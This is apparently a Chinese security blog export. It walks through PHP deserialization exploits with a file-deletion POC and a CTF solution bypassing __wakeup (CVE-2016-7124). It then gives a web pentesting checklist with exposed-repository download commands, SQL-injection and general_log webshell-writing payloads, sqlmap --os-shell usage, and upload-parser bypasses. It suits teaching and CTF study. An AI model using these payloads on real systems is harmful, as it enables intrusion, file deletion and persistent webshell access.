<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建Person类 </span></span><br><span class="line"><span class="comment">变量为name和age </span></span><br><span class="line"><span class="comment">方法为Information</span></span><br><span class="line"><span class="comment">对象为$per</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' is '</span>.<span class="keyword">$this</span>-&gt;age . <span class="string">'years old .&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> unserialize(<span class="string">'O:6:"Person":2:&#123;s:4:"name";s:5:"melon";s:3:"age";i:18;&#125;'</span>);</span><br><span class="line">	$per -&gt; Information();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Person3.png" alt="html">    </p>
<h3 id="4-php魔法函数"><a href="#4-php魔法函数" class="headerlink" title="4.php魔法函数"></a>4.php魔法函数</h3><p>php类中包含了一些魔法函数，这些函数可以在脚本的任何地方不用声明就可以使用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">		php魔法函数 魔法函数可以在脚本的任何地方不用声明就可以使用</span><br><span class="line">		与php（反）   序列化有关的魔法函数   					</span><br><span class="line">		_construct() 当一个对象被创建时调用				   </span><br><span class="line">		__destruct() 当对象被销毁时						 </span><br><span class="line">		__wakeup()	 使用unserialize						 </span><br><span class="line">		__sleep()	 使用serialize时触发</span><br><span class="line">		__toSting()	 把类当作字符串使用时触发</span><br><span class="line">		__get()		用于从不可访问的属性读取数据</span><br><span class="line">		__set()  	用于数据写入不可访问的属性时</span><br><span class="line">		__isset()  	在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">		__unset()	在不可访问的属性上使用unset()时触发</span><br><span class="line">		__invoke()	当脚本尝试将对象调用为函数时触发</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<h3 id="5-魔法函数举一个例子"><a href="#5-魔法函数举一个例子" class="headerlink" title="5.魔法函数举一个例子"></a>5.魔法函数举一个例子</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' is '</span>.<span class="keyword">$this</span>-&gt;age . <span class="string">'years old .&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    在类里创建三个魔法函数测试</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'I am __toString &lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'I am __construct &lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'I am __destruct &lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$per = <span class="keyword">new</span> Person();       <span class="comment">//创建类执行 __construct</span></span><br><span class="line">	$per -&gt; name = <span class="string">'melon'</span>;</span><br><span class="line">	$per -&gt; age =<span class="number">18</span>;</span><br><span class="line">	<span class="keyword">echo</span> $per;				  <span class="comment">//把类当字符串打印 执行__toString 然后类被销毁 执行 __destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Person4.png" alt="html">    </p>
<h3 id="6-反序列化漏洞"><a href="#6-反序列化漏洞" class="headerlink" title="6.反序列化漏洞"></a>6.反序列化漏洞</h3><p>php反序列化漏洞又称对象注入可能会导致注入，远程代码执行等安全问题的发生。</p>
<p>php反序列化漏洞如何产生：如果一个php代码中使用了unserialize函数去调用某一类，该类中会自动执行一些自定义函数的magic method，这些magic method中如果包含了一些危险操作，或者这些magic method会去调用类中其他带有危险操作的函数，如果这些危险操作是我们可控的，那么就可以进行一些危害操作甚至getshell。</p>
<h2 id="0x01-PHP反序列化Demo"><a href="#0x01-PHP反序列化Demo" class="headerlink" title="0x01 PHP反序列化Demo"></a>0x01 PHP反序列化Demo</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//delete.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">delete</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">'error'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;filename.<span class="string">'was deleted &lt;br/&gt;'</span>;</span><br><span class="line">        unlink(dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在代码中可以看到，delete类中定义了一个__destruct()函数，该函数中会执行删除文件操作。如果我们想利用该类来执行任意文件删除操作，则需要找一个可控的unserialize()函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Person.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Delete.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">'is'</span>.<span class="keyword">$this</span>-&gt;age.<span class="string">'years old&lt;br/&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$per = unserialize($_REQUEST[<span class="string">'file'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>漏洞成因：我们的Person.php文件包含了Delete.php 要想达到任意文件删除的目的就需要控制传入的文件名 而文件名参数是$filename 那怎样控制filename变量就是我们的目的 首先我们知道<code>__destruct</code>魔法函数 是对象销毁的时候执行的 当对Person传一个参数file是 对象销毁 执行魔法函数删除文件操作 因为对传入参数做了反序列化处理所以我们构造一个序列化对象 其中我们构造的对象中filename的值要覆盖掉Delete.php中filename的值来达到删除任意文件的目的。</p>
<p>构造POC：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">delete</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">'error'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$melon = <span class="keyword">new</span> delete();</span><br><span class="line">$melon-&gt;filename=<span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($melon);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对Person.php发起请求：<code>file=O:6:&quot;delete&quot;:1:{s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;}</code></p>
<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/rmfile.png" alt="html">    </p>
<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/flag.png" alt="html">    </p>
<h2 id="0x02-关于PHP反序列化的题目"><a href="#0x02-关于PHP反序列化的题目" class="headerlink" title="0x02 关于PHP反序列化的题目"></a>0x02 关于PHP反序列化的题目</h2><p>代码入下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//查找file文件中的字符串，如果有'\\'和'/'在字符串中，就显示错误</span></span><br><span class="line">            <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt;file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))</span><br><span class="line">    &#123; </span><br><span class="line">        show_source(<span class="string">'index.php'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">       $file=base64_decode( $_GET[<span class="string">'file'</span>]); </span><br><span class="line">       <span class="keyword">echo</span> unserialize($file ); </span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span>  <span class="comment">#&lt;!--flag in flag.php--&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先对象创建执行 __destruct函数 我们发现GET获取file参数值的时候会反序列化 我们可以利用反序列化覆盖掉file的值</p>
<p>下面构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $file = <span class="string">'a'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$melon = <span class="keyword">new</span> SoFun();</span><br><span class="line"><span class="keyword">echo</span> serialize($melon);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>生成<code>O:5:&quot;SoFun&quot;:1:{s:7:&quot;*file&quot;;s:1:&quot;a&quot;;}</code> </p>
<p>因为file是protected访问权限所以生成的序列化字符串带*号 绕过访问权限可以在 * 号的两边加 \00</p>
<p>当执行反序列化时 执行__wakeup函数 强制使file的值变为index.php </p>
<p>序列化串行中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行  <a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">CVE-2016-7124</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1 : O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line">payload2 : O:5:&quot;SoFun&quot;:2:&#123;s:11:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;&#125; </span><br><span class="line">当s:11的s是小写时 \00 认为占三位 </span><br><span class="line">当S:7的S是大写时 \00 占一位</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/flagmelon.png" alt="html">    </p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>漏洞挖掘</tag>
        <tag>序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB渗透测试之漏洞挖掘</title>
    <url>/2019/12/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<p>漏洞：通常情况下不影响软件的正常功能，但如果被攻击者利用，有可能驱使软件去执行一些额外的恶意代码，从而引发严重的后果。最常见的漏洞有缓冲区溢出漏洞、整数溢出漏洞、指针覆盖漏洞等。</p>
<a id="more"></a>

<h2 id="传统WEB查找利用阶段"><a href="#传统WEB查找利用阶段" class="headerlink" title="传统WEB查找利用阶段"></a>传统WEB查找利用阶段</h2><h3 id="1-敏感目录文件扫描"><a href="#1-敏感目录文件扫描" class="headerlink" title="1.敏感目录文件扫描"></a>1.敏感目录文件扫描</h3><h4 id="1-查找目标各类web入口"><a href="#1-查找目标各类web入口" class="headerlink" title="1.查找目标各类web入口"></a>1.查找目标各类web入口</h4><p>普通网站后台，其他web控制台，碰到任何入口的第一反应就是顺手测试弱口令如果没有结果记录下来可以进行爆破，没有验证码的可以尝试爆破。限制登陆次数尝试伪造IP绕过。</p>
<h4 id="2-各类敏感文件泄露"><a href="#2-各类敏感文件泄露" class="headerlink" title="2.各类敏感文件泄露"></a>2.各类敏感文件泄露</h4><h5 id="版本管理软件造成的泄露"><a href="#版本管理软件造成的泄露" class="headerlink" title="版本管理软件造成的泄露"></a>版本管理软件造成的泄露</h5><p><strong>.git/git</strong> 利用工具：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a> 手动利用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/.git</span><br><span class="line">cd www.example.com &amp;&amp; git reset --hard</span><br></pre></td></tr></table></figure>

<p><strong>.hg/Mercurial</strong> 可以利用工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 也可以手动利用（下载+回滚）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/.hg</span><br><span class="line">cd www.example.com &amp;&amp; hg revert</span><br></pre></td></tr></table></figure>

<p><strong>.svn/Subversion</strong> 可以利用工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 也可以手动利用（下载+回滚）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/.svn</span><br><span class="line">cd www.example.com &amp;&amp; svn revert --recursive .</span><br></pre></td></tr></table></figure>

<p><strong>.bzr/Bazaar</strong> 可以利用工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 也可以手动利用（下载+回滚）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/.bzr</span><br><span class="line">cd www.example.com &amp;&amp; bzr revert</span><br></pre></td></tr></table></figure>

<p>CVS 可以利用工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 也可以手动利用（下载+回滚）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/CVS</span><br><span class="line">cd www.example.com &amp;&amp; cvs diff *</span><br></pre></td></tr></table></figure>

<h5 id="文件包含导致的泄露"><a href="#文件包含导致的泄露" class="headerlink" title="文件包含导致的泄露"></a>文件包含导致的泄露</h5><p><strong>.DS_Store文件泄露 (Desktop Services Store)</strong></p>
<p>是macOS目录下的隐藏文件, 包含了当前目录结构和一些的自定义信息,如背景和图标位置等, 在windows下类似的文件为desktop.ini. 暴露了.DS_Store文件也就相当于暴露了该目录下的所有内容. </p>
<p>利用工具：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">ds_store_exp</a></p>
<p><strong>WEB-INF泄露</strong></p>
<p>在Java的<a href="http://download.oracle.com/otn-pub/jcp/servlet-2.4-fr-spec-oth-JSpec/servlet-2_4-fr-spec.pdf" target="_blank" rel="noopener">Servlet 文档</a>中,说到<code>WEB-INF</code>目录”包含了所有web应用会用到但是不处于web路径中的资源”, 也就是说, WEB-INF目录下的内容是不属于公开页面的.<br>web应用可以通过<code>getResource</code>等API在servlet的上下文中访问到这些资源.<br>通常开发者会把许多JSP文件,Jar包,Java的类文件放在该目录下. 一般目录的内容都是可以预测的:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">WEB-INF/database.properties : 数据库配置文件</span><br><span class="line">WEB-INF/classes/ : 一般用来存放Java类文件(.class)</span><br><span class="line">WEB-INF/lib/ : 用来存放打包好的库(.jar)</span><br><span class="line">WEB-INF/src/ : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure>

<p>利用方式：通过web.xml文件推测应用组件相关类的名字, 然后在src目录下查找代码, 如果没有源代码可以直接下载class文件反编译即可.</p>
<p><strong>备份文件泄露</strong></p>
<p>备份文件泄露又分为两种情况, 一种是运维人员偷懒地直接在网站根目录用类似<code>tar -czvf bakup.tgz</code>的命令将网站进行备份,这样整站的源代码都能直接被用户打包下载了；<br>另一种是开发或者运维人员使用的编辑器修改文件时自动备份了所编辑的网页内容,<br>如vim的<code>.swp</code>, 从而泄露了该网页的源代码.</p>
<p>利用方法：对于打包文件而言, 渗透测试人员可以用{常用文件名}+{常用压缩包后缀}的方式扫描网站, 说不定会有意外惊喜.<br>对于网页的临时备份文件, 可以扫描对应页面的.swp或者.bak等后缀, 说不定也能找到有用的信息.</p>
<p><strong>配置文件泄露</strong><br>现代WEB开发往往不会重新造轮子, 而是基于成熟的框架进行配置, 如果渗透测试人员知道该网站是基于什么类型的框架,<br>就可能通过该框架的文档获得重要配置文件的路径, 如果是开源框架, 同时也能获得源代码, 因此配置文件泄露的严重性也是不言而喻的.</p>
<p>利用方法：通过识别网站指纹得知其框架类型, 然后手工测试重要的配置文件是否可以获取. 如果是批量测试, 则可以事先准备好常见的配置文件路径, 如wordpress的/wp-config.php等, 组织成字典然后用脚本进行批量测试. 可以参考<a href="https://github.com/ring04h/weakfilescan/blob/master/dict/configfile.lst" target="_blank" rel="noopener">猪猪侠的字典</a>.</p>
<p><strong>配置错误导致的泄露</strong></p>
<p>Windows IIS / Apache 目录穿越</p>
<p>目录穿越漏洞原理比较简单, 程序在实现上没有充分过滤用户输入的../之类的目录跳转符, 导致恶意用户可以访问web根目录的上级从而遍历服务器上的任意文件.</p>
<p><strong>Nginx配置安全</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location /file &#123;</span><br><span class="line">    alias /home;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例如这样配置 访问 url/file 会正常显示服务器上/home的文件，但是访问url/file../ 就会出现 /home/../访问到服务器的根目录造成目录穿越</p>
<h3 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2.SQL注入"></a>2.SQL注入</h3><p>首先确认数据库的用户权限</p>
<h4 id="1-可以注入的一些部分"><a href="#1-可以注入的一些部分" class="headerlink" title="1.可以注入的一些部分"></a>1.可以注入的一些部分</h4><p>GET注入在url中</p>
<p>在POST注入</p>
<p>在HTTP头部注入 例如：cookie Referer user-agent X-Forwarded-For 等等</p>
<p>二次注入，宽字节注入，ajax/json注入，nosql注入，用来对付为静态的中转注入 等等</p>
<h4 id="2-管理员权限"><a href="#2-管理员权限" class="headerlink" title="2.管理员权限"></a>2.管理员权限</h4><p><strong>尝试直接写webshell</strong>：</p>
<p><strong>日志写</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.show variables like ‘%general%&apos;; #查看配置</span><br><span class="line">2.set global general_log = on; #开启general log模式</span><br><span class="line">3.set global general_log_file = ‘/var/www/html/melon.php&apos;; #设置日志目录为shell地址</span><br><span class="line">4.select ‘&lt;?php eval($_POST[melon]);?&gt;’ #写入shell</span><br><span class="line">不成功的案例，如果mysql 被降权，是无法写入到其他的站点目录的，除非你的目标目录是可以写入的。</span><br></pre></td></tr></table></figure>

<p><strong>正常sql写</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过SQL注入select into outfile实现，如：</span><br><span class="line">1&apos; union select 1,&apos;&lt;?php eval($_POST[melon]);?&gt;&apos; INTO OUTFILE &apos;/var/www/tmp/nb.php&apos;#</span><br><span class="line">2.如果过过滤了union select可以使用：</span><br><span class="line">LIMIT 0,1 INTO OUTFILE &apos;这里是路径&apos; LINES TERMINATED BY &apos;这里是你想写的内容&apos;--</span><br></pre></td></tr></table></figure>

<p><strong>sqlmap写shell</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--os-cmd=&quot;net user&quot;</span><br><span class="line">交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径下创建文件返回结果，然后再自动删除。</span><br><span class="line"></span><br><span class="line">--os-shell</span><br><span class="line">写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。</span><br><span class="line">注意:关闭sqlmap文件就会被删除。</span><br></pre></td></tr></table></figure>

<p><strong>本地写入webshell</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先在sqlmap的目录创建mst目录，然后在该目录中创建mst.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址，--file-write &quot;./mst/mst.txt&quot; --file-dest &quot;网站的绝对路径/melon.php&quot;。</span><br><span class="line">注意需要最高权限。</span><br></pre></td></tr></table></figure>

<p><strong>尝试执行系统命令</strong></p>
<p>反弹shell，cmd</p>
<p><strong>尝试读取数据库配置文件中的账号密码</strong></p>
<h4 id="3-普通数据库权限"><a href="#3-普通数据库权限" class="headerlink" title="3.普通数据库权限"></a>3.普通数据库权限</h4><p>查询网站管理账号密码，搜集会员账号密码数据，尝试万能密码bypass登陆 等等</p>
<h3 id="3-上传"><a href="#3-上传" class="headerlink" title="3.上传"></a>3.上传</h3><h4 id="1-各个web中间件解析漏洞"><a href="#1-各个web中间件解析漏洞" class="headerlink" title="1.各个web中间件解析漏洞"></a>1.各个web中间件解析漏洞</h4><h5 id="IIS-5-x-6-x解析漏洞"><a href="#IIS-5-x-6-x解析漏洞" class="headerlink" title="IIS 5.x-6.x解析漏洞"></a>IIS 5.x-6.x解析漏洞</h5><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
<p><strong>目录解析(6.0)</strong></p>
<p>案例：<code>www.xxx.com/xx.asp/xx.jpg</code></p>
<p>原理：服务器默认会把.asp，.asa目录下的文件全部解析乘asp文件</p>
<p><strong>文件解析</strong></p>
<p>案例：<code>www.xxx.com/xx.asp;,jpg</code></p>
<p>原理：服务默认不解析分号之后的内容，因此<code>xx.asp;,jpg</code>便被解析成了asp文件</p>
<p><strong>解析文件类型</strong></p>
<p>IIS6.0默认的可执行文件除了asp还包含这三种：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/xxx.asa /xxx.cer /xxx.cdx</span><br></pre></td></tr></table></figure>

<h5 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h5><p>案例：<code>www.xxx.com/xxx.php.aaa.rar</code></p>
<p>原理：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 xxx.php.aaa.rar “.aaa”和”.rar” 这两种后缀是Apache不可识别解析,Apache就会把xxx.php.aaa.rar解析成php。</p>
<p><strong>CVE-2017-15715</strong></p>
<p><strong>罕见后缀</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@xxx:~$ cat /etc/mime.types | grep php</span><br><span class="line">  #application/x-httpd-php          	phtml pht php</span><br><span class="line">  #application/x-httpd-php-source           	phps</span><br><span class="line">  #application/x-httpd-php3         			php3</span><br><span class="line">  #application/x-httpd-php3-preprocessed	 	php3p</span><br><span class="line">  #application/x-httpd-php4         			php4</span><br><span class="line">  #application/x-httpd-php5         			php5</span><br></pre></td></tr></table></figure>

<h5 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h5><p>原理：Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问<a href="http://www.xx.com/phpinfo.jpg/test.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/test.php”，然后构造成SCRIPT_FILENAME传递给PHP" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/test.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/test.php”，然后构造成SCRIPT_FILENAME传递给PHP</a> CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而test.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<p>案例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.xxxx.com/UploadFiles/image/melon.jpg/melon.php</span><br><span class="line">www.xxxx.com/UploadFiles/image/melon.jpg%00.php</span><br><span class="line">www.xxxx.com/UploadFiles/image/melon.jpg/%20\melon.php</span><br></pre></td></tr></table></figure>

<h4 id="2-bypass-上传检测"><a href="#2-bypass-上传检测" class="headerlink" title="2.bypass 上传检测"></a>2.bypass 上传检测</h4><p>黑名单，白名单可配合解析漏洞，截断，.htaccess，配合本地包含一起利用。</p>
<p>补：截断：%00</p>
<h4 id="3-各类编辑器利用"><a href="#3-各类编辑器利用" class="headerlink" title="3.各类编辑器利用"></a>3.各类编辑器利用</h4><p>FCKeditor编辑器，EWEbeditor，CKFinder，南方数据编辑器southidceditor，UEDITOE，DotNetTextBox，PHPWEB网站管理系统后台Kedit编辑器，Cute Editor 在线编辑器本地包含漏洞 等等</p>
<h3 id="4-未授权访问"><a href="#4-未授权访问" class="headerlink" title="4.未授权访问"></a>4.未授权访问</h3><p>前端验证绕过，直接访问[ajax]，验证有死角没有验证全部页面 等等</p>
<h3 id="5-文件包含"><a href="#5-文件包含" class="headerlink" title="5.文件包含"></a>5.文件包含</h3><p><em>本地包含（LFI），远程包含（RFI），远程文件包含需要在php.ini中开启 allow_url_fopen=on、allow_url_include=on(默认是关闭的 )。</em></p>
<p>文件包含的本质其实和C语言中预处理指令一样。那么这句话等价替换就是 <code>&lt;?php &lt;?php phpinfo()?&gt; ?&gt;</code>其实不然，如果替换成这样，后面的?&gt;会被页面打印出来,正确的是它是将文件中<code>&lt;?php ?&gt;</code> 去除，将剩余的内容进行替换,那这样的话再利用的时候不用考虑文件包含的文件类型是什么，只需要考虑文件之中是否有我们所需要的一句话木马就可以了。</p>
<p><strong>涉及的函数</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include()</span><br><span class="line">使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</span><br><span class="line">inclue_once()</span><br><span class="line">功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span><br><span class="line">require()</span><br><span class="line">使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</span><br><span class="line">require_once()</span><br><span class="line">功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span><br></pre></td></tr></table></figure>

<p><strong>测试</strong>：</p>
<p>melon.txt代码为  <code>&lt;?php eval($_REQUEST[&#39;melon&#39;]);?&gt;</code></p>
<p>melon.php代码为    <code>&lt;?php include($_REQUEST[&#39;file&#39;]);?&gt;</code></p>
